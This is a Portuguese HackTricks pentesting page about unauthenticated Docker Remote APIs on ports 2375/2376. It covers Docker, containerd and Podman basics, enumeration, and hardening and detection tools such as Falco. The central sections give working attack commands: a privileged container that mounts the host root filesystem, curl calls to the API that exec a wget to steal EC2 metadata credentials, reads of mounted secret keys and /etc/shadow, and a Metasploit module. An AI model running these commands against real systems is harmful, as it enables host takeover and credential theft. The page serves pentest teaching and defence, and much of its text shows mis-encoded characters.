# 2375, 2376 Testando Docker

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares de roubo**.

O principal objetivo do WhiteIntel √© combater a apropria√ß√£o de contas e ataques de ransomware resultantes de malwares de roubo de informa√ß√µes.

Voc√™ pode verificar o site deles e experimentar o mecanismo de busca de forma **gratuita** em:

{% embed url="https://whiteintel.io" %}

***

### Conceitos B√°sicos do Docker

#### O que √©

Docker √© a **plataforma l√≠der** na ind√∫stria de **containeriza√ß√£o**, liderando a **inova√ß√£o cont√≠nua**. Facilita a cria√ß√£o e distribui√ß√£o sem esfor√ßo de aplicativos, abrangendo desde os **tradicionais at√© os futuristas**, e garante a **implanta√ß√£o segura** deles em diversos ambientes.

#### Arquitetura b√°sica do Docker

* [**containerd**](http://containerd.io): Este √© um **tempo de execu√ß√£o central** para cont√™ineres, encarregado da **gest√£o abrangente do ciclo de vida de um cont√™iner**. Isso envolve lidar com a **transfer√™ncia e armazenamento de imagens**, al√©m de supervisionar a **execu√ß√£o, monitoramento e rede** de cont√™ineres. **Mais insights detalhados** sobre o containerd s√£o **explorados ainda mais**.
* O **container-shim** desempenha um papel cr√≠tico como um **intermedi√°rio** no manuseio de **cont√™ineres sem interface gr√°fica**, assumindo perfeitamente o controle do **runc** ap√≥s a inicializa√ß√£o dos cont√™ineres.
* [**runc**](http://runc.io): Estimado por suas capacidades de **tempo de execu√ß√£o de cont√™iner leve e universal**, o runc est√° alinhado com o **padr√£o OCI**. √â usado pelo containerd para **iniciar e gerenciar cont√™ineres** de acordo com as **diretrizes OCI**, tendo evolu√≠do do **libcontainer** original.
* [**grpc**](http://www.grpc.io) √© essencial para **facilitar a comunica√ß√£o** entre o containerd e o **docker-engine**, garantindo uma **intera√ß√£o eficiente**.
* O [**OCI**](https://www.opencontainers.org) √© fundamental para manter as **especifica√ß√µes OCI** para tempo de execu√ß√£o e imagens, sendo as vers√µes mais recentes do Docker **compat√≠veis com os padr√µes de imagem e tempo de execu√ß√£o** OCI. 

#### Comandos b√°sicos
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** foi desenvolvido especificamente para atender √†s necessidades de plataformas de cont√™ineres como **Docker e Kubernetes**, entre outras. Seu objetivo √© **simplificar a execu√ß√£o de cont√™ineres** em v√°rios sistemas operacionais, incluindo Linux, Windows, Solaris e outros, abstraindo funcionalidades espec√≠ficas do sistema operacional e chamadas de sistema. O objetivo do Containerd √© incluir apenas os recursos essenciais necess√°rios pelos usu√°rios, buscando omitir componentes desnecess√°rios. No entanto, alcan√ßar esse objetivo completamente √© reconhecido como desafiador.

Uma decis√£o de design chave √© que **Containerd n√£o lida com redes**. A rede √© considerada um elemento cr√≠tico em sistemas distribu√≠dos, com complexidades como Redes Definidas por Software (SDN) e descoberta de servi√ßos que variam significativamente de uma plataforma para outra. Portanto, o Containerd deixa os aspectos de rede para serem gerenciados pelas plataformas que ele suporta.

Enquanto o **Docker utiliza o Containerd** para executar cont√™ineres, √© importante observar que o Containerd suporta apenas um subconjunto das funcionalidades do Docker. Especificamente, o Containerd n√£o possui as capacidades de gerenciamento de rede presentes no Docker e n√£o suporta a cria√ß√£o de swarms do Docker diretamente. Essa distin√ß√£o destaca o papel focado do Containerd como um ambiente de tempo de execu√ß√£o de cont√™iner, delegando funcionalidades mais especializadas para as plataformas com as quais se integra.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** √© um mecanismo de cont√™iner de c√≥digo aberto que adere aos [padr√µes da Iniciativa de Cont√™iner Aberto (OCI)](https://github.com/opencontainers), desenvolvido e mantido pela Red Hat. Ele se destaca do Docker com v√°rias caracter√≠sticas distintas, especialmente sua **arquitetura sem daemon** e suporte para **cont√™ineres sem raiz**, permitindo que os usu√°rios executem cont√™ineres sem privil√©gios de root.

O Podman √© projetado para ser compat√≠vel com a API do Docker, permitindo o uso de comandos da CLI do Docker. Essa compatibilidade se estende ao seu ecossistema, que inclui ferramentas como **Buildah** para construir imagens de cont√™iner e **Skopeo** para opera√ß√µes de imagem como push, pull e inspect. Mais detalhes sobre essas ferramentas podem ser encontrados em sua [p√°gina do GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Diferen√ßas Chave**

* **Arquitetura**: Ao contr√°rio do modelo cliente-servidor do Docker com um daemon em segundo plano, o Podman opera sem um daemon. Esse design significa que os cont√™ineres s√£o executados com os privil√©gios do usu√°rio que os inicia, aumentando a seguran√ßa ao eliminar a necessidade de acesso de root.
* **Integra√ß√£o com Systemd**: O Podman se integra ao **systemd** para gerenciar cont√™ineres, permitindo o gerenciamento de cont√™ineres por meio de unidades systemd. Isso contrasta com o uso do systemd pelo Docker principalmente para gerenciar o processo do daemon do Docker.
* **Cont√™ineres sem Raiz**: Uma caracter√≠stica fundamental do Podman √© sua capacidade de executar cont√™ineres sob os privil√©gios do usu√°rio iniciante. Essa abordagem minimiza os riscos associados a viola√ß√µes de cont√™iner, garantindo que os invasores obtenham apenas os privil√©gios do usu√°rio comprometido, e n√£o acesso de root.

A abordagem do Podman oferece uma alternativa segura e flex√≠vel ao Docker, enfatizando o gerenciamento de privil√©gios do usu√°rio e a compatibilidade com os fluxos de trabalho existentes do Docker.

{% hint style="info" %}
Observe que, como o Podman visa suportar a mesma API que o Docker, voc√™ pode usar os mesmos comandos com o Podman como com o Docker, como:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Informa√ß√£o B√°sica

A API Remota est√° em execu√ß√£o por padr√£o na porta 2375 quando habilitada. O servi√ßo por padr√£o n√£o exigir√° autentica√ß√£o, permitindo que um atacante inicie um cont√™iner docker privilegiado. Ao usar a API Remota, √© poss√≠vel anexar hosts / (diret√≥rio raiz) ao cont√™iner e ler/escrever arquivos do ambiente do host.

**Porta padr√£o:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumera√ß√£o

#### Manual

Note que, para enumerar a API do docker, voc√™ pode usar o comando `docker` ou `curl` como no exemplo a seguir:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Se voc√™ pode **acessar a API remota do docker com o comando `docker`** voc√™ pode **executar** qualquer um dos **comandos docker** [**comentados anteriormente**](2375-pentesting-docker.md#basic-commands) para interagir com o servi√ßo.

{% hint style="info" %}
Voc√™ pode `export DOCKER_HOST="tcp://localhost:2375"` e **evitar** usar o par√¢metro `-H` com o comando docker
{% endhint %}

**Escalonamento r√°pido de privil√©gios**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

√Äs vezes voc√™ ver√° **2376** dispon√≠vel para o endpoint **TLS**. N√£o consegui me conectar a ele com o cliente docker, mas √© poss√≠vel fazer isso com o curl.
```bash
#List containers
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s ‚Äìinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it‚Äôs also worth checking out services in case they are adding secrets via environment variables)
curl -s ‚Äìinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Se deseja mais informa√ß√µes sobre isso, mais informa√ß√µes est√£o dispon√≠veis de onde copiei os comandos: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Autom√°tico
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Comprometimento

Na p√°gina a seguir, voc√™ pode encontrar maneiras de **escapar de um cont√™iner do Docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Abusando disso, √© poss√≠vel escapar de um cont√™iner, voc√™ poderia executar um cont√™iner fraco na m√°quina remota, escapar dele e comprometer a m√°quina:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Escala√ß√£o de Privil√©gios

Se voc√™ estiver dentro de um host que est√° usando o Docker, voc√™ pode [**ler estas informa√ß√µes para tentar elevar os privil√©gios**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Descobrindo segredos em cont√™ineres Docker em execu√ß√£o
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Verifique a se√ß√£o de vari√°veis de ambiente para segredos e voc√™ pode encontrar:

* Senhas.
* IPs.
* Portas.
* Caminhos.
* Outros... .

Se voc√™ deseja extrair um arquivo:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Protegendo seu Docker

#### Protegendo a instala√ß√£o e uso do Docker

* Voc√™ pode usar a ferramenta [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) para inspecionar sua instala√ß√£o atual do Docker.
* `./docker-bench-security.sh`
* Voc√™ pode usar a ferramenta [https://github.com/kost/dockscan](https://github.com/kost/dockscan) para inspecionar sua instala√ß√£o atual do Docker.
* `dockscan -v unix:///var/run/docker.sock`
* Voc√™ pode usar a ferramenta [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) para verificar os privil√©gios que um cont√™iner ter√° ao ser executado com diferentes op√ß√µes de seguran√ßa. Isso √© √∫til para saber as implica√ß√µes de usar algumas op√ß√µes de seguran√ßa para executar um cont√™iner:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Protegendo Imagens do Docker

* Voc√™ pode usar uma imagem do Docker de [https://github.com/quay/clair](https://github.com/quay/clair) para fazer a verifica√ß√£o de suas outras imagens do Docker e encontrar vulnerabilidades.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Protegendo Dockerfiles

* Voc√™ pode usar a ferramenta [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configura√ß√µes incorretas. Cada configura√ß√£o incorreta receber√° um ID, voc√™ pode encontrar aqui [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) como corrigir cada uma delas.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* Voc√™ pode usar a ferramenta [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configura√ß√µes incorretas.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* Voc√™ pode usar a ferramenta [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configura√ß√µes incorretas.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* Voc√™ pode usar a ferramenta [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configura√ß√µes incorretas.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### Registrando atividades suspeitas

* Voc√™ pode usar a ferramenta [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) para detectar **comportamentos suspeitos em cont√™ineres em execu√ß√£o**.
* Observe no trecho a seguir como o **Falco compila um m√≥dulo de kernel e o insere**. Depois disso, ele carrega as regras e **come√ßa a registrar atividades suspeitas**. Neste caso, ele detectou 2 cont√™ineres privilegiados iniciados, sendo que um deles com um ponto de montagem sens√≠vel, e ap√≥s alguns segundos detectou como um shell foi aberto dentro de um dos cont√™ineres.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Monitoramento do Docker

Voc√™ pode usar o auditd para monitorar o docker.

### Refer√™ncias

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares de roubo**.

O principal objetivo do WhiteIntel √© combater tomadas de contas e ataques de ransomware resultantes de malwares de roubo de informa√ß√µes.

Voc√™ pode verificar o site deles e experimentar o mecanismo gratuitamente em:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
